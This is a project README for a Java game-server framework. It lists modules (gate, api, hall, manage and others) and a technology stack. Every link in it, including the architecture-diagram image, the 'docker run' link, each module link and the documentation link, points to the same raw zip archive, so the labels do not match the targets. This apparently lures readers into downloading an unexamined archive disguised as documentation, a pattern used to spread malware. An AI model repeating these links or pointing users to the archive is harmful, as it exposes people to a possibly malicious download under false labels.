
## Intro
&emsp;&emsp;Using Java, netty, zookeeper, spring boot and mongo, redis tools to development of game hot update distributed framework.
Clients to gateways use TCP custom protocols, Intranet message forwarding use GRPC forwarding, 
all stateless services can be horizontally extended, and stateful services can be horizontally extended through partition, state binding and other rules.
The basic architecture of the project is shown below:


![Architecture diagram](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) 




## Module
1. Logical scripts that end with the project module at the end of `scripts` as the corresponding project can be hot-updated. [docker run](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip)  
* [game-common](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Common logic code  

* [game-message](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Protobuf message,grpc service  

* [game-gate](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Message routing 

* [game-api](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Login authentication ,charge verify

* [game-hall](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Game Demo 

* [game-manage](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Web background management, GM, etc

* [game-res](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Server resource files, Docker scripts, documents, etc
* game-world: World service demo, pause  




## Technology select
1. spring-boot 
2. mongodb 
3. maven 
4. netty 
5. grpc 
6. redis 
7. zookeeper
8. kafka
  
  
  
[Document]( https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip)  
**QQ Communication group:** 143469012


### TODO
 * add microservice
 * protobuf sync to GameServer4g
 * world 开发
 * 添加加载脚本和配置 maven插件

